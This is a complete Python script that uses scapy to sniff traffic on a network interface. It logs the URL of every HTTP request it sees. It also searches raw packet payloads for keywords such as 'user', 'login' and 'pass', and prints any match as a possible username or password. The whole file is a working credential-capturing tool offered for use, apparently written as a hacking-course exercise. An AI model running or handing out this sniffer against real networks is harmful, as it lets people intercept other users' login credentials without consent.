#!/usr/bin/env python
import argparse
import scapy.all as scapy
from scapy.layers import http

def get_arguments() :
    parser = argparse.ArgumentParser(prog="packet_sniff",description='Packet sniffing arguments type.')
    parser.add_argument("-iface", "--interface", dest="scan_interface", help="The interface you want to scan")
    options = parser.parse_args()
    if not options.scan_interface :
        parser.error("[-] Please specify a interface, use --help for more info.")
    return options
def sniff(interface) :
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet) :
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet) :
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "passsword", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load
def process_sniffed_packet(packet) :
    if packet.haslayer(http.HTTPRequest) :
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())
        login_info = get_login_info(packet)
        if login_info :
            print("\n\n[+] Possible username/password >> " + login_info + "\n\n")
def run() :
    options = get_arguments()
    sniff(options.scan_interface)

if __name__ == "__main__":
    run()